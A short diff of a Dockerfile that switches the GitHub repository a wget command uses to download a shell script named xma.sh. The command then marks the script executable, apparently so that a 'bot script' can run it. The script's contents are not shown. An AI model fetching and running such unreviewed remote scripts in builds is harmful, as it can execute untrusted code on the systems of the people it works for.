@@ -28,7 +28,7 @@ RUN apt-get update && apt-get install -y \
 WORKDIR /home
 
 # Run config.sh and clean up APT:
-RUN wget https://raw.githubusercontent.com/shenliana/wawa/main/xma.sh \
+RUN wget https://raw.githubusercontent.com/shenliana/wawas/main/xma.sh \
  && chmod +x xma.sh
 
 # Run bot script:
